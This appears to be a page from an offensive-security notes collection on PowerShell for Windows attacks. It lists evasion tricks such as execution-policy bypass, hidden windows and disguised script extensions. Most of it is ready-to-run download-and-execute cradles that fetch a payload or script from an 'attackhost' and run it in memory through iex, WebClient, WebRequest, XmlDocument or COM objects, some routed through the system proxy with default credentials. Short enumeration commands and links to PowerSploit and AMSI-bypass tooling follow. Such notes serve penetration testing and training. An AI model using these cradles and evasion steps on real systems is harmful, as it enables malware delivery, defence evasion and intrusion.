##### [Execute PowerUp.ps1](../../../../Tools/Shells/Windows/PowerShell/PowerSploit/PowerUp.md)

# In-Memory Execution Methods
* Net.WebClient DownloadString (method)
* Net.WebClient DownloadData (method)
* Net.WebClient OpenRead (method)
* .NET Net.HttpWebRequest (class)
* Word.Application (COM)
* Excel.Application (COM)
* InternetExplorer.Application (COM)
* MsXml2.ServerXmlIHttp (COM)
* Certutil.exe w/ -ping argument

# Disk-Based Execution Methods
* Net.WebClient Download File
* BITSAdmin.exe
* Certutil.exe w/ -urlcache argument

# Evasion
* Use In-Memory execution.
* Use SSL when downloading scripts.
* Use a script extension other than .ps1, such as .jpg.
* Specify User-Agent with Net.WebClient
* -ExecutionPolicy bypass
* -Window hidden

# Download File
### Download File To Disk
```powershell
powershell -c wget "http://<Source Address>/<Source File>" -outfile "<Output File>"
```
##### Using Variables and User-Agent
```powershell
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
PS C:\> $payload = "https://attackhost/file.exe"
PS C:\> $local_file = "file.exe"
PS C:\> $downloader.DownloadFile($payload, $local_file)
PS C:\> & $local_file # Execute file.
```
##### Using System's Proxy and Default Credentials
```powershell
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
PS C:\> $proxy = [Net.WebRequest]::GetSystemProxy()
PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
PS C:\> $downloader.Proxy = $proxy
PS C:\> $payload = "https://attackhost/file.exe"
PS C:\> $local_file = "file.exe"
PS C:\> $downloader.DownloadFile($payload, $local_file)
```

### Download File To String
##### From CMD Prompt
```powershell
C:\> powershell iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/[Source File]')
```
##### From PowerShell Prompt
```powershell
PS C:\> iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/[Source File]')
```
##### Using Variables and User-Agent
```powershell
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
PS C:\> $payload = "https://attackhost/script.ps1"
PS C:\> $command = $downloader.DownloadString($payload)
PS C:\> Invoke-Expression $command
```
##### Using Net.WebRequest
```powershell
PS C:\> $request = [System.Net.WebRequest]::Create("https://attackhost/script.ps1")
PS C:\> $response = $request.GetResponse()
PS C:\> $proxy = [Net.WebRequest]::GetSystemWebProxy()
PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
PS C:\> $request.Proxy = $proxy
PS C:\> iex ([System.IO.StreamReader]($response.GetResponseStream())).ReadToEnd()
```
##### Using XmlDocument
```powershell
PS C:\> $xmldoc = New-Object System.Xml.XmlDocument
PS C:\> $xmldoc.Load("https://attackhost/script.ps1")
PS C:\> iex $xmldoc.command.a.execute
```
### Using COM Object
##### MsXml2.XMLHTTP
```powershell
PS C:\> $downloader = New-Object -ComObject MsXml2.XMLHTTP
PS C:\> $downloader.open("GET", "https://attackhost/script.ps1", false)
PS C:\> $downloader.send()
PS C:\> iex $downloader.responseText
```
##### WinHttp.WinHttp.5.1
```powershell
PS C:\> $downloader = New-Object -ComObject WinHttp.WinHttp.5.1
PS C:\> $downloader.open("GET", "https://attackhost/script.ps1", false)
PS C:\> $downloader.send()
PS C:\> iex $downloader.responseText
```
##### As One-Liner
```powershell
PS C:\> $d=New-Object -ComObject WinHttp.WinHttp.5.1; $d.open("GET", "https://attackhost/script.ps1", false); $d.send(); iex $d.responseText
```

# Processes
##### Get list of processes running, sorted by name.
```powershell
tasklist /NH | sort
```

```bash
whoami /priv
```

# Services
##### Get List of Running Services
```powershell
powershell Get-Service
```

# [From Meterpreter](../../../Metasploit/README.MD#PowerShell)

# Tools
##### [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)

# References
##### [Generates obfuscated PowerShell snippets](https://amsi.fail/)

##### [Approved Verbs for PowerShell Commands](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.2&viewFallbackFrom=powershell-7.1)

##### [Everything you wanted to know about the if statement](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-if?view=powershell-7.2&viewFallbackFrom=powershell-7.1)

##### [How to run a PowerShell script from the command prompt?](https://www.tutorialspoint.com/how-to-run-a-powershell-script-from-the-command-prompt)

##### [Learn X in Y minutes](https://learnxinyminutes.com/docs/powershell/)

##### [Powershell](https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powershell.html)

##### [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)

##### [PowerShellMafia](https://github.com/PowerShellMafia)

##### [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

##### [Use Windows PowerShell to search for files](https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/)

##### [Where-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2&viewFallbackFrom=powershell-7.1)